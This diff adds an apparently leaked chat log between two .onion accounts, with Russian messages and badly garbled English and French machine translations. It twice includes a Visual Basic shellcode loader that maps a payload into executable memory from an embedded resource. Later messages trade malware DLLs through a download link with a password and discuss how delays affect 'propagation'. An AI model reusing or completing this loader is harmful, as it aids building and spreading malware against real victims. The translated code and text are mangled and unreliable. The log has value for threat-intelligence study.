@@ -1,0 +1,342 @@
+##################################################
+Conversation between:
+	- hof@q3mcco35auwcstmt.onion
+	- many@q3mcco35auwcstmt.onion
+29 messages
+first: 2021-02-19T11:38:45.303267
+last:  2021-12-08T12:17:48.435738
+##################################################
+
+2021-02-19T11:38:45.303267  many@q3mcco35auwcstmt.onion
+	[ru] еще тот нужен
+	[en] still need it
+	[fr] toujours besoin
+
+2021-02-24T20:31:12.123521  many@q3mcco35auwcstmt.onion
+	[ru] Function TestFunc() As Boolean
+    
+    hInstance = GetModuleHandle(ByVal 0&)
+    
+    tLenght = mHCP(AddressOf tshellStart) - mHCP(AddressOf tShellEnd)
+    
+    tDis = VirtualAlloc(ByVal 0&, tLenght, MEM_COMMIT, &H40)
+    
+    CopyMemory ByVal tDis, ByVal mHCP(AddressOf tShellEnd), tLenght
+    
+    tSpliceFromRes AddressOf BexToPointer, tDis + mHCP(AddressOf fContent) - mHCP(AddressOf tShellEnd)
+    
+    InitMyShellCode (tDis)
+
+    Dim hResource       As Long:                Dim hMememory       As Long
+    Dim lResSize        As Long:                Dim pRawData        As Long
+
+    hResource = FindResource(hInstance, GetString(PROJECT), RT_RCDATA)
+    
+    hMememory = LoadResource(hInstance, hResource)
+    
+    lResSize = SizeofResource(hInstance, hResource)
+    
+    pRawData = LockResource(hMememory)
+    
+    Dim ret As Variant
+    ret = MessageBox(0, "0", "0", 0)
+
+    BexToPointer pRawData
+        
+    
+End Function
+	[en] Function TestFunc () as Boolean
+    
+    Hinstance = GetModuleHandle (Byval 0 &)
+    
+    TLENGHT = MHCP (Addness TshellStart) - MHCP (Addness Tshellend)
+    
+    TDIS = VirtualAlloc (Byval 0 & Tlenght, Mem_Commit, & H40)
+    
+    CopyMemory Byval Tdis, Byval MHCP (Addressof Tshellend), Tlenght
+    
+    TspliceFromres Addressof BextoPointer, TDIS + MHCP (Address FConent) - MHCP (Addressof Tshellend)
+    
+    InitmyshellCode (TDIS)
+
+    Dim Hresource AS Long: Dim Hmememory AS Long
+    Dim Lressize AS Long: Dim Prawdata AS Long
+
+    Hresource = FindResource (Hinstance, GetString (Project), RT_RCDATA)
+    
+    Hmememory = LoadResource (Hinstance, Hresource)
+    
+    Lressize = Sizeofresource (Hinstance, Hresource)
+    
+    Prawdata = LockResource (Hmememory)
+    
+    DIM RET AS VARIANT
+    RET = MessageBox (0, "0", "0", 0)
+
+    BEXTOPOINTER PRAWDATA.
+        
+    
+End Function.
+	[fr] Fonction testfunc () comme booléen
+    
+    Hinstance = getmodulehandle (byval 0 &)
+    
+    Tlenght = MHCP (addition ttshellstart) - MHCP (addition t tshellend)
+    
+    TDIS = Virtualalloc (BYVAL 0 & TLENGHT, MEM_COMMIT, & H40)
+    
+    CopyMémoire BYVAL TDIS, BYVAL MHCP (adresse de tculquement), TLENGHT
+    
+    TSPLICEFROMRES ADRESSOF BEXTOPOINTER, TDIS + MHCP (Address Fonent) - MHCP (adresse de t tshellend)
+    
+    Initmyshellcode (TDIS)
+
+    Dim Hresource There: Dim HMEMEMORIEL SUR LA TERME
+    Dim Lressize There: Dim Prawdata aussi longtemps
+
+    Hresource = Findresource (Hinstance, GetString (Project), RT_RCDATA)
+    
+    HMEMEMORY = LOADRESOURCE (hinstance, hresource)
+    
+    Lrressiondizer = Tailleofresource (Hinstance, Hresource)
+    
+    Prawdata = Lockresource (hmememorie)
+    
+    Dim RET comme variante
+    RET = MessageBox (0, "0", "0", 0)
+
+    Bexopointer prawdata.
+        
+    
+Fonction finale.
+
+2021-02-24T20:31:27.659449  many@q3mcco35auwcstmt.onion
+	[ru] так блиг тоже не работает(( создаю ехе работает
+	[en] so turning also does not work ((I create EXE works
+	[fr] alors tournant aussi ne fonctionne pas (i crée des œuvres exe
+
+2021-02-24T20:32:16.785298  many@q3mcco35auwcstmt.onion
+	[ru] создаю длл (может неправельно создаю или что то еще надо) не работает доходит до    ret = MessageBox(0, "0", "0", 0) и все.. но ошибки нет типо ресурс не найден
+	[en] I create a DLL (it can be unreimible or something else necessary) does not work reaching RET = MessageBox (0, "0", "0", 0) and all .. but no errors have a type of resource not found
+	[fr] Je crée une DLL (il peut être irrémédiable ou quelque chose d'autre nécessaire) ne fonctionne pas d'atteindre RET = MessageBox (0, "0", "0", 0) et tout .. mais aucune erreur n'a un type de ressource introuvable
+
+2021-02-25T06:52:19.949229  many@q3mcco35auwcstmt.onion
+	[ru] так блиг тоже не работает(( создаю ехе работает
+	[en] so turning also does not work ((I create EXE works
+	[fr] alors tournant aussi ne fonctionne pas (i crée des œuvres exe
+
+2021-02-25T06:52:19.951729  many@q3mcco35auwcstmt.onion
+	[ru] Function TestFunc() As Boolean
+    
+    hInstance = GetModuleHandle(ByVal 0&)
+    
+    tLenght = mHCP(AddressOf tshellStart) - mHCP(AddressOf tShellEnd)
+    
+    tDis = VirtualAlloc(ByVal 0&, tLenght, MEM_COMMIT, &H40)
+    
+    CopyMemory ByVal tDis, ByVal mHCP(AddressOf tShellEnd), tLenght
+    
+    tSpliceFromRes AddressOf BexToPointer, tDis + mHCP(AddressOf fContent) - mHCP(AddressOf tShellEnd)
+    
+    InitMyShellCode (tDis)
+
+    Dim hResource       As Long:                Dim hMememory       As Long
+    Dim lResSize        As Long:                Dim pRawData        As Long
+
+    hResource = FindResource(hInstance, GetString(PROJECT), RT_RCDATA)
+    
+    hMememory = LoadResource(hInstance, hResource)
+    
+    lResSize = SizeofResource(hInstance, hResource)
+    
+    pRawData = LockResource(hMememory)
+    
+    Dim ret As Variant
+    ret = MessageBox(0, "0", "0", 0)
+
+    BexToPointer pRawData
+        
+    
+End Function
+	[en] Function TestFunc () as Boolean
+    
+    Hinstance = GetModuleHandle (Byval 0 &)
+    
+    TLENGHT = MHCP (Addness TshellStart) - MHCP (Addness Tshellend)
+    
+    TDIS = VirtualAlloc (Byval 0 & Tlenght, Mem_Commit, & H40)
+    
+    CopyMemory Byval Tdis, Byval MHCP (Addressof Tshellend), Tlenght
+    
+    TspliceFromres Addressof BextoPointer, TDIS + MHCP (Address FConent) - MHCP (Addressof Tshellend)
+    
+    InitmyshellCode (TDIS)
+
+    Dim Hresource AS Long: Dim Hmememory AS Long
+    Dim Lressize AS Long: Dim Prawdata AS Long
+
+    Hresource = FindResource (Hinstance, GetString (Project), RT_RCDATA)
+    
+    Hmememory = LoadResource (Hinstance, Hresource)
+    
+    Lressize = Sizeofresource (Hinstance, Hresource)
+    
+    Prawdata = LockResource (Hmememory)
+    
+    DIM RET AS VARIANT
+    RET = MessageBox (0, "0", "0", 0)
+
+    BEXTOPOINTER PRAWDATA.
+        
+    
+End Function.
+	[fr] Fonction testfunc () comme booléen
+    
+    Hinstance = getmodulehandle (byval 0 &)
+    
+    Tlenght = MHCP (addition ttshellstart) - MHCP (addition t tshellend)
+    
+    TDIS = Virtualalloc (BYVAL 0 & TLENGHT, MEM_COMMIT, & H40)
+    
+    CopyMémoire BYVAL TDIS, BYVAL MHCP (adresse de tculquement), TLENGHT
+    
+    TSPLICEFROMRES ADRESSOF BEXTOPOINTER, TDIS + MHCP (Address Fonent) - MHCP (adresse de t tshellend)
+    
+    Initmyshellcode (TDIS)
+
+    Dim Hresource There: Dim HMEMEMORIEL SUR LA TERME
+    Dim Lressize There: Dim Prawdata aussi longtemps
+
+    Hresource = Findresource (Hinstance, GetString (Project), RT_RCDATA)
+    
+    HMEMEMORY = LOADRESOURCE (hinstance, hresource)
+    
+    Lrressiondizer = Tailleofresource (Hinstance, Hresource)
+    
+    Prawdata = Lockresource (hmememorie)
+    
+    Dim RET comme variante
+    RET = MessageBox (0, "0", "0", 0)
+
+    Bexopointer prawdata.
+        
+    
+Fonction finale.
+
+2021-02-25T06:52:19.953182  many@q3mcco35auwcstmt.onion
+	[ru] создаю длл (может неправельно создаю или что то еще надо) не работает доходит до    ret = MessageBox(0, "0", "0", 0) и все.. но ошибки нет типо ресурс не найден
+	[en] I create a DLL (it can be unreimible or something else necessary) does not work reaching RET = MessageBox (0, "0", "0", 0) and all .. but no errors have a type of resource not found
+	[fr] Je crée une DLL (il peut être irrémédiable ou quelque chose d'autre nécessaire) ne fonctionne pas d'atteindre RET = MessageBox (0, "0", "0", 0) et tout .. mais aucune erreur n'a un type de ressource introuvable
+
+2021-03-22T12:19:25.202777  hof@q3mcco35auwcstmt.onion
+	[ru] привет
+	[en] Hey
+	[fr] Hé
+
+2021-06-24T10:00:13.396963  hof@q3mcco35auwcstmt.onion
+	[ru] залиты свежие
+	[en] <?>
+	[fr] <?>
+
+2021-07-21T09:08:01.550779  many@q3mcco35auwcstmt.onion
+	[ru] привет дай плз зев и сат дллы
+	[en] <?>
+	[fr] <?>
+
+2021-07-21T09:08:19.582145  hof@q3mcco35auwcstmt.onion
+	[ru] привет, скоро закину
+	[en] <?>
+	[fr] <?>
+
+2021-07-21T09:44:11.820849  hof@q3mcco35auwcstmt.onion
+	[ru] 1e3Q2erBxddcF52cd0r
+Download: https://qaz.im/load/ZYyR5G/AnrEzG
+Delete: https://qaz.im/index.php?a=delete&q=1233836586
+	[en] <?>
+	[fr] <?>
+
+2021-07-21T09:45:54.247760  many@q3mcco35auwcstmt.onion
+	[ru] ok sps
+	[en] <?>
+	[fr] <?>
+
+2021-07-21T10:16:24.944798  many@q3mcco35auwcstmt.onion
+	[ru] а задержка на файлах если ставить
+	[en] <?>
+	[fr] <?>
+
+2021-07-21T10:16:34.913834  many@q3mcco35auwcstmt.onion
+	[ru] влияет на размножение
+	[en] <?>
+	[fr] <?>
+
+2021-07-21T10:16:36.482960  many@q3mcco35auwcstmt.onion
+	[ru] ?
+	[en] <?>
+	[fr] <?>
+
+2021-07-21T10:20:40.337800  hof@q3mcco35auwcstmt.onion
+	[ru] а задержка на файлах если ставить
+	[en] <?>
+	[fr] <?>
+
+2021-07-21T10:20:40.340434  hof@q3mcco35auwcstmt.onion
+	[ru] влияет на размножение
+	[en] <?>
+	[fr] <?>
+
+2021-07-21T10:20:40.344939  hof@q3mcco35auwcstmt.onion
+	[ru] ?
+	[en] <?>
+	[fr] <?>
+
+2021-08-04T11:56:32.575553  many@q3mcco35auwcstmt.onion
+	[ru] привет
+	[en] <?>
+	[fr] <?>
+
+2021-09-10T11:29:16.695158  many@q3mcco35auwcstmt.onion
+	[ru] zev4.dll и zem1.dll дай плз
+	[en] <?>
+	[fr] <?>
+
+2021-09-10T11:30:47.627772  hof@q3mcco35auwcstmt.onion
+	[ru] ща
+	[en] <?>
+	[fr] <?>
+
+2021-09-22T12:04:31.571391  many@q3mcco35auwcstmt.onion
+	[ru] бро дай роб.133 длл
+	[en] <?>
+	[fr] <?>
+
+2021-09-22T12:04:38.831073  many@q3mcco35auwcstmt.onion
+	[ru] плиз
+	[en] <?>
+	[fr] <?>
+
+2021-09-22T12:04:50.803096  many@q3mcco35auwcstmt.onion
+	[ru] привкт
+	[en] <?>
+	[fr] <?>
+
+2021-09-22T12:06:13.494129  hof@q3mcco35auwcstmt.onion
+	[ru] привет
+	[en] <?>
+	[fr] <?>
+
+2021-09-28T15:26:11.916330  hof@q3mcco35auwcstmt.onion
+	[ru] привет
+	[en] <?>
+	[fr] <?>
+
+2021-10-26T12:18:54.785403  many@q3mcco35auwcstmt.onion
+	[ru] привет на 170 группу тройки строка
+	[en] <?>
+	[fr] <?>
+
+2021-12-08T12:17:48.435738  many@q3mcco35auwcstmt.onion
+	[ru] привет
+	[en] <?>
+	[fr] <?>
+
